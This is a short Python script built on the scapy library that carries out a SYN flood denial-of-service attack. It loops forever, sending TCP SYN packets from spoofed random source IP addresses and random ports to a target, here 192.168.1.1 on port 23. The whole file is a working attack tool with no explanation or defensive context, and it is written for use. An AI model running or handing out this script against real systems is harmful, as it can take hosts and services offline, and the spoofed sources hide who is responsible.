from scapy.all import *
import random
def syn_dos(ip, port):
	while True:
		ports=random.randint(1024,65535)
		init_sn=random.randint(1,65535)		
		send(IP(src=RandIP("*.*.*.*"),dst=ip)/TCP(dport=port,sport=ports,flags=2,seq=init_sn), verbose = False)

if __name__ == '__main__':
	syn_dos("192.168.1.1", 23)
